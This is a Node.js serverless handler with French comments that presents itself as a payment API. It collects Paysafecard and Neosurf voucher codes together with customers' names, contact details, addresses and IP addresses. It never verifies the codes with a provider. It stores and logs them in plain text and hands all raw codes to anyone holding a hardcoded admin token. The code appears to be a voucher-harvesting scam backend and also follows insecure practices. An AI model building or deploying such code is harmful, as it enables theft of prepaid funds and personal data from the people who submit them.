// api/payment.js
// Stockage en mémoire (reset à chaque cold start Vercel)
let payments = [];

/**
 * API de paiement
 *  - POST  /api/payment  : enregistre un nouveau code
 *  - GET   /api/payment  : liste des paiements (admin uniquement, via header x-admin-token)
 */
export default async function handler(req, res) {
  // ----- POST: nouvel achat -----
  if (req.method === 'POST') {
    try {
      const {
        method,
        code,
        firstName,
        lastName,
        email,
        phone,
        street,
        city,
        postalCode,
        country
      } = req.body || {};

      // Vérif champs obligatoires
      if (!method || !code) {
        return res.status(400).json({ success: false, error: 'Missing method or code' });
      }

      // Nettoyage du code (enlève espaces / tirets)
      const cleanCode = String(code).replace(/[^0-9]/g, '');

      // Validation longueur
      if (method === 'paysafecard' && cleanCode.length !== 16) {
        return res.status(400).json({ success: false, error: 'Paysafecard: 16 chiffres requis' });
      }
      if (method === 'neosurf' && cleanCode.length !== 10) {
        return res.status(400).json({ success: false, error: 'Neosurf: 10 chiffres requis' });
      }

      // Récup IP
      const ip =
        req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
        req.connection?.remoteAddress ||
        null;

      // Nouveau paiement (code inclus mais jamais renvoyé au frontend)
      const payment = {
        id: Date.now(),
        method,
        code: cleanCode, // ← VRAI CODE STOCKÉ SERVEUR-SIDE
        customer: { firstName, lastName, email, phone },
        billing: { street, city, postalCode, country },
        ip,
        timestamp: new Date().toISOString()
      };

      payments.unshift(payment);

      // Log serveur (visible dans Vercel → Logs)
      console.log(
        `NEW PAYMENT method=${method} code=${cleanCode} email=${email} ip=${ip}`
      );

      return res.status(200).json({ success: true });
    } catch (err) {
      console.error('Error in POST /api/payment:', err);
      return res.status(500).json({ success: false, error: 'Server error' });
    }
  }

  // ----- GET: admin seulement -----
  if (req.method === 'GET') {
    const adminToken = req.headers['x-admin-token'];

    // Utilise une variable d’env pour plus de sécurité si tu veux :
    // const expected = process.env.ADMIN_TOKEN || 'EPITA2026-SECURE';
    const expected = 'EPITA2026-SECURE';

    if (adminToken !== expected) {
      return res.status(401).json({ error: 'Unauthorized' });
    }

    // Ici tu récupères tous les paiements (codes inclus) depuis ton PC
    // via curl/Postman, pas depuis le frontend.
    return res.status(200).json(payments);
  }

  // ----- Autres méthodes non autorisées -----
  return res.status(405).json({ error: 'Method not allowed' });
}
